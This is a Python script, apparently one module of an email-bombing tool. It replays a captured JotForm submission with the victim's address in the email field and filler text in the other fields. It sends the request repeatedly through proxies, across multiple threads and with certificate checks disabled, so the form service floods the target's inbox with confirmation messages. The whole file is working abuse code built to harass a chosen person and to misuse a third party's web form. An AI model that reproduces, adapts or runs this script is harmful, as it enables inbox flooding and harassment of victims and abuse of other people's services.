import datetime
from concurrent.futures import ThreadPoolExecutor
from os.path import basename

import requests

import module
from module import Spam

headers = {
    'authority': 'submit.jotformpro.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarym5FGLMm8lfB1jORO',
    # 'cookie': 'userReferer=https%3A%2F%2Fsubmit.jotformpro.com%2Fsubmit%2F31895183083965%2F; theme=tile-black; guest=guest_674c83b3ffb68a1a; language=ru-RU; _ga=GA1.2.1084685020.1676981865; _gid=GA1.2.1448339605.1676981865; last_form=30576733176964',
    'origin': 'https://form.jotformpro.com',
    'referer': 'https://form.jotformpro.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        timestamp = str(datetime.datetime.now().timestamp()).replace(".", "")[:-3]
        form_id = '82314594184965'
        event_id = f'{timestamp}_{form_id}_{module.generate_text(7)}'
        data = '------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="formID"\r\n\r\n30075319304951\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q1_firstName"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q3_lastName"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q5_company"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[addr_line1]"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[addr_line2]"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[city]"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[state]"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[postal]"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q24_yourAddress[country]"\r\n\r\nAfghanistan\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q11_phoneNo"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q12_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q13_website13"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q48_doYou"\r\n\r\nYes\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q18_companyName18"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q20_companyAddress20"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q21_phoneNumber"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q22_websiteAddress"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q37_emailAddress"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q23_pleaseState"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q41_yourColour41"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q52_ifApplicable"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q53_invoiceNumber53"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q30_pleaseConfirm30[]"\r\n\r\nIndividual colour scheme\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="q36_anyInfo"\r\n\r\ntest\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="website"\r\n\r\n\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="simple_spc"\r\n\r\n30075319304951-30075319304951\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="event_id"\r\n\r\n1676984019606_30075319304951_hXgIjB4\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="temp_upload_folder"\r\n\r\n30075319304951_63f4bed30977d\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO\r\nContent-Disposition: form-data; name="validatedRequiredFieldIDs"\r\n\r\n{"id_1":true,"id_3":true,"id_5":true,"id_24":true,"id_11":true,"id_12":true,"id_48":true,"id_18":true,"id_20":true,"id_23":true,"id_53":true,"id_30":true}\r\n------WebKitFormBoundarym5FGLMm8lfB1jORO--\r\n'
        data = data.replace('1676984019606_30075319304951_hXgIjB4', event_id)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())

        response = requests.post('https://submit.jotformpro.com/submit/30075319304951/', headers=headers,
                                 data=data.encode(), proxies=self.get_proxies(), timeout=10, verify=False)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank You')

    with ThreadPoolExecutor(10) as worker:
        results = worker.map(spam.send_post, ['wezxasqw@gmail.com' for _ in range(15)])
    if any(results):
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
